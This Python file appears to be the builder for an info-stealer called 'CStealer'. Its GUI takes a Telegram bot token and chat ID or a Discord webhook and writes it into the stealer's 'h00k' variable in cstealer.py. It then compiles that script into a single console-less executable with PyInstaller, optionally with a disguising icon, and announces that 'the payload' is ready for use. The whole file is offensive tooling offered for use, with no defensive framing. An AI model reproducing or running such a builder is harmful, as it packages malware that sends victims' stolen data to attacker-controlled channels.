import os
import shutil
import requests
import customtkinter as ctk
from tkinter import messagebox, filedialog

ctk.set_appearance_mode("dark")
app = ctk.CTk()
app.title("CStealer Builder ~ Version 2.1")
app.iconbitmap("CStealer_assets\\img\\logo.ico")
app.geometry("400x600")
app.resizable(False, False)

app.update_idletasks()
screen_width = app.winfo_screenwidth()
screen_height = app.winfo_screenheight()
x = (screen_width - app.winfo_reqwidth()) // 2
y = (screen_height - app.winfo_reqheight()) // 2
app.geometry(f"+{x}+{y}")

def send_telegram_message(bot_token, group_id, message):
    api_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    payload = {
        'chat_id': group_id,
        'text': message
    }
    response = requests.post(api_url, json=payload)
    
    print("Telegram Response status code:", response.status_code)
    print("Telegram Response text:", response.text)
    
    if response.status_code == 200:
        print("Telegram message sent successfully")
        return True
    else:
        try:
            error_data = response.json()
            if 'parameters' in error_data and 'migrate_to_chat_id' in error_data['parameters']:
                new_chat_id = error_data['parameters']['migrate_to_chat_id']
                payload['chat_id'] = new_chat_id
                response = requests.post(api_url, json=payload)
                print("Retry response status code:", response.status_code)
                print("Retry response text:", response.text)
                if response.status_code == 200:
                    print("Telegram message sent to new supergroup successfully")
                    return True
                else:
                    messagebox.showerror("Error", f"Failed to send message to the new Telegram chat ID. Response: {response.text}")
            else:
                messagebox.showerror("Error", f"Failed to send Telegram message. Response: {response.text}")
        except ValueError:
            messagebox.showerror("Error", f"Failed to send Telegram message. Response: {response.text}")
        return False

def send_discord_message(webhook_url, message):
    payload = {
        'content': message
    }
    response = requests.post(webhook_url, json=payload)
    
    print("Discord Response status code:", response.status_code)
    print("Discord Response text:", response.text)
    
    if response.status_code == 204:
        print("Discord message sent successfully")
        return True
    else:
        messagebox.showerror("Error", f"Failed to send Discord message. Response: {response.text}")
        return False

def replace_webhook(webhook, platform):
    file_path = 'cstealer.py'

    with open(file_path, 'r', encoding='utf-8') as file:
        lines = file.readlines()

    for i, line in enumerate(lines):
        if line.strip().startswith('h00k ='):
            lines[i] = f'h00k = "{webhook}"\n'
            break

    with open(file_path, 'w', encoding='utf-8') as file:
        file.writelines(lines)

def select_icon():
    icon_path = filedialog.askopenfilename(filetypes=[("Icon files", "*.ico")])
    return icon_path

def add_icon():
    response = messagebox.askquestion("Add Icon", "Do you want to add an icon?")
    return response == 'yes'

def build_exe():
    platform = platform_var.get()
    bot_token = entry_token.get()
    group_id = entry_group_id.get()
    webhook_url = entry_webhook.get()

    if platform == "Telegram" and (not bot_token or not group_id):
        messagebox.showerror("Error", "Please enter both the Telegram Bot Token and Group ID.")
        return
    elif platform == "Discord" and not webhook_url:
        messagebox.showerror("Error", "Please enter the Discord Webhook URL.")
        return

    if platform == "Telegram":
        test_message = "Testing connection before starting the build process."
        if not send_telegram_message(bot_token, group_id, test_message):
            return

        replace_webhook(bot_token, platform)
        start_message = "The build process has started. This may take a while..."
        send_telegram_message(bot_token, group_id, start_message)
        
    elif platform == "Discord":
        test_message = "Testing connection before starting the build process."
        if not send_discord_message(webhook_url, test_message):
            return

        replace_webhook(webhook_url, platform)
        start_message = "The build process has started. This may take a while..."
        send_discord_message(webhook_url, start_message)

    icon_choice = add_icon()
    if icon_choice:
        icon_path = select_icon()
        if not icon_path:
            messagebox.showerror("Error", "No icon file selected.")
            return
        else:
            icon_option = f' --icon="{icon_path}"'
    else:
        icon_option = ''

    try:
        messagebox.showinfo("Information", start_message)

        dist_path = os.path.join(os.getcwd(), "dist")
        build_command = f'python -m PyInstaller cstealer.py --noconsole --onefile{icon_option}'
        os.system(build_command)

        messagebox.showinfo("Build Success", "Build process completed successfully.")
        
        success_message = "The payload has been successfully built and is ready for use."
        if platform == "Telegram":
            send_telegram_message(bot_token, group_id, success_message)
        elif platform == "Discord":
            send_discord_message(webhook_url, success_message)

    except Exception as e:
        messagebox.showerror("Error", f"An error occurred during the build process: {str(e)}")

label = ctk.CTkLabel(master=app, text="CStealer", text_color=("white"), font=("Helvetica", 26))
label.place(relx=0.5, rely=0.05, anchor=ctk.CENTER)

platform_var = ctk.StringVar(value="Telegram")
platform_label = ctk.CTkLabel(master=app, text="Select Platform:")
platform_label.place(relx=0.5, rely=0.15, anchor=ctk.CENTER)

platform_options = ctk.CTkOptionMenu(master=app, values=["Telegram", "Discord"], variable=platform_var)
platform_options.place(relx=0.5, rely=0.2, anchor=ctk.CENTER)

entry_token = ctk.CTkEntry(master=app, width=230, height=30, placeholder_text="Enter Telegram Bot Token")
entry_token.place(relx=0.5, rely=0.3, anchor=ctk.CENTER)

entry_group_id = ctk.CTkEntry(master=app, width=230, height=30, placeholder_text="Enter Telegram Group Chat ID")
entry_group_id.place(relx=0.5, rely=0.4, anchor=ctk.CENTER)

entry_webhook = ctk.CTkEntry(master=app, width=230, height=30, placeholder_text="Enter Discord Webhook URL")
entry_webhook.place(relx=0.5, rely=0.5, anchor=ctk.CENTER)

button = ctk.CTkButton(master=app, text="Build EXE", text_color="white", hover_color="#363636", fg_color="black", command=build_exe)
button.place(relx=0.5, rely=0.7, anchor=ctk.CENTER)

def update_input_fields(*args):
    platform = platform_var.get()
    if platform == "Telegram":
        entry_token.place(relx=0.5, rely=0.3, anchor=ctk.CENTER)
        entry_group_id.place(relx=0.5, rely=0.4, anchor=ctk.CENTER)
        entry_webhook.place_forget()
    elif platform == "Discord":
        entry_token.place_forget()
        entry_group_id.place_forget()
        entry_webhook.place(relx=0.5, rely=0.3, anchor=ctk.CENTER)

platform_var.trace_add("write", update_input_fields)
update_input_fields()
app.mainloop()

